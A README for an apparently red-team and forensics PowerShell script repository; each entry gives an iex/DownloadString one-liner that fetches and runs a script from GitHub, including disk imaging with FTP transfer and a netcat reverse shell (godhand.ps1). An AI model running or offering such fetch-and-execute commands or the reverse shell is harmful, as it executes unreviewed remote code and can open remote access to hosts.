# Eren Red Team
This repository contains the scripts that is created by Eren Red Team.

## bootstrap.ps1
Downloads necessary installation packages for CyberPipe and runs it, creates .vhdx file of the target.
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/bootstrap.ps1')
```

## transfer.ps1
Automatically finds .vhdx file in the determined destination path and sends it to FTP server.
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/transfer.ps1')
```

## cekmece.ps1
Triage tools with little automation
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/cekmece.ps1') 
```

## inspedefe.ps1
String search tool inspired by Didier Stevens's PDFiD
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/inspedefe.ps1') 
```

## korktunmu.ps1
Python and PIP Installation using Chocolatey
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/korktunmu.ps1') 
```

## olegunnar.ps1
Glue to use ole-tools
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/korktunmu.ps1') 
```

## godhand.ps1
Simple reverse shell with netcat without no obfuscation
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/godhand.ps1') 
```
